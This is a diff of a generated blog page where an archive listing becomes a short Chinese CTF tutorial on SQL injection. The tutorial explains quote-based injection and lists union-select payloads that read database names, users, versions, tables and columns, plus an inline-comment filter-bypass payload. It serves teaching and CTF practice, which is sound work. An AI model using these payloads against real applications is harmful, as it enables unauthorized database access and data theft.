@@ -6,7 +6,7 @@
   <meta name="author" content="Runindark">
   
   
-  <title>归档: 2019 | Cat&#39;s blog</title>
+  <title>ctf攻防之sql注入 | Cat&#39;s blog</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,7 +15,7 @@
   
 
   
-  <meta name="description" content="">
+  <meta name="description" content="基础sql注入">
 
   
 
@@ -42,7 +42,7 @@
     welcome: {"enable":true,"interval":30},
     start_time: "2018-02-10",
     passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
-    is_post: false,
+    is_post: true,
     lock: false,
     author: "Runindark",
     share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
@@ -160,73 +160,95 @@
 </nav>
 <div id="site-process"></div>
     <main>
-      <div class="timeline">
-  <h2 class="timeline-title">归档: 37篇</h2>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-10-15
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    ctf攻防之sql注入
+  </h1>
   
-    
-      <h3 class="timeline-subtitle">2019</h3>
-    
-    <div class="timeline-item">
-      <time>2019-10-21</time>
-      <a target="_self" href="/2019/10/21/CTF-杂记/">ctf杂录</a>
-    </div>
+  <article class="passage-article">
+    <p></p>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+<h3 id="sql注入的基本原理"><a href="#sql注入的基本原理" class="headerlink" title="sql注入的基本原理"></a>sql注入的基本原理</h3><ol>
+<li>sql注入的主要原因来自sql查询的字符串拼接，例如我们正常输入1，那么呈现</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>但是如果进行心机输入 1’ ,那么将会变成 ==》</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1''</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>继续下去，因为两个 ‘ 的原因，那么则会产生sql syntax error ,所以需要产生注释后面的内容，我们需要#，因此输入 1’#</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span><span class="comment">#' </span></span><br><span class="line"></span><br><span class="line">===============&gt; 明显一些</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure>
+<h3 id="sql注入常用基本操作————主要利用union-select联合查询继续获取信息"><a href="#sql注入常用基本操作————主要利用union-select联合查询继续获取信息" class="headerlink" title="sql注入常用基本操作————主要利用union select联合查询继续获取信息"></a>sql注入常用基本操作————主要利用union select联合查询继续获取信息</h3><ol>
+<li>获取数据库的基础信息<blockquote>
+<p>1’ union select database(),user()#<br>database()返回当前使用的数据库名称<br>user() 返回当前使用者的信息</p>
+</blockquote>
+</li>
+<li>获取操作系统等功能<blockquote>
+<p>1’ union select version(),@@version_compile_os#<br>version() 获取当前数据库版本<br>@@version_compile_os 获取当前操作系统@@version_compile_os 获取当前操作系统</p>
+</blockquote>
+</li>
+<li>获取数据库的表名<blockquote>
+<p>1’ union select table_names,table_schema from information_schema.tables where table_schema = ‘table name’ #<br>数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库<br>ps: 数据库会用一个information_schema.tables来记录表的信息</p>
+</blockquote>
+</li>
+<li>获取数据库的列名<blockquote>
+<p>1’ union select group_concat(column_name) from information_schema.columns where table_schema=database()</p>
+</blockquote>
+</li>
+<li>内联注释绕过<blockquote>
+<p>上述union select 可能会被拦截，因此使用注释绕过，用/<em>！XX </em>/ 包裹，来实现绕过<br>word=1%’ and 1=2 /<em>!union</em>/   /<em>!select</em>/ database(),user(),database() %23&amp;§number=5§<br>转自： <a href="https://www.cnblogs.com/baimaoma/p/8608490.html" target="_blank" rel="noopener">https://www.cnblogs.com/baimaoma/p/8608490.html</a></p>
+</blockquote>
+</li>
+</ol>
+</the>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入的基本原理"><span class="toc-text">sql注入的基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入常用基本操作————主要利用union-select联合查询继续获取信息"><span class="toc-text">sql注入常用基本操作————主要利用union select联合查询继续获取信息</span></a></li></ol>
+  </div>
+</aside>
   
-    
-    <div class="timeline-item">
-      <time>2019-10-15</time>
-      <a target="_self" href="/2019/10/15/CTF-SQL注入/">ctf攻防之sql注入</a>
-    </div>
+    <aside class="passage-copyright">
+      <div>本文作者: Runindark</div>
+      
+      <div>
+        
+      </div>
+    </aside>
   
-    
-    <div class="timeline-item">
-      <time>2019-08-07</time>
-      <a target="_self" href="/2019/08/07/Springboot各类常用配置/">SpringBoot 一些常用配置【持续更新】</a>
-    </div>
-  
-    
-    <div class="timeline-item">
-      <time>2019-08-07</time>
-      <a target="_self" href="/2019/08/07/springboot整合微信/">springboot 整合 微信小程序</a>
-    </div>
-  
-    
-    <div class="timeline-item">
-      <time>2019-08-07</time>
-      <a target="_self" href="/2019/08/07/springboot整合redis/">SpringBoot整合redis</a>
-    </div>
-  
-    
-    <div class="timeline-item">
-      <time>2019-08-07</time>
-      <a target="_self" href="/2019/08/07/Springboot整合JWT/">SpringBoot整合jwt</a>
-    </div>
-  
-    
-    <div class="timeline-item">
-      <time>2019-05-19</time>
-      <a target="_self" href="/2019/05/19/docker-compose/">docker-compose.yml</a>
-    </div>
-  
-    
-    <div class="timeline-item">
-      <time>2019-05-16</time>
-      <a target="_self" href="/2019/05/16/服务压力测试教程/">服务器压力测试</a>
-    </div>
-  
-    
-    <div class="timeline-item">
-      <time>2019-05-14</time>
-      <a target="_self" href="/2019/05/14/Cesium/">Cesium构建项目</a>
-    </div>
-  
-    
-    <div class="timeline-item">
-      <time>2019-04-29</time>
-      <a target="_self" href="/2019/04/29/pytorch-02-数据的加载和预处理/">数据加载和预处理</a>
-    </div>
   
 </div>
+
     </main>
+    
+      
+<div class="site-comment-contanier" data-plateform="leancloud">
+  
+    <p id="site-comment-info">
+      <i class="fa fa-spinner fa-spin"></i> 评论加载中
+    </p>
+    <div id="site-comment"></div>
+  
+</div>
     
     <div class="site-footer-wrapper">
   <footer class="site-footer">
@@ -286,19 +308,19 @@
 
 <div class="bottom-bar">
   <div class="bottom-bar-left">
-    <a href="javascript:void(0);" data-enable="false">
+    <a href="/2019/10/21/CTF-杂记/" data-enable="true">
       <i class="fa fa-arrow-left"></i>
     </a>
-    <a href="/archives/2019/page/2/" data-enable="true">
+    <a href="/2019/08/07/Springboot各类常用配置/" data-enable="true">
       <i class="fa fa-arrow-right"></i>
     </a>
   </div>
   <div class="bottom-bar-right">
-    <a href="javascript:void(0);" data-enable="false" id="site-toc-show-btn">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
       <i class="fa fa-bars"></i>
     </a>
     
-      <a href="javascript:void(0);" data-enable="false">
+      <a href="#site-comment" data-enable="true">
         <i class="fa fa-commenting"></i>
       </a>
     
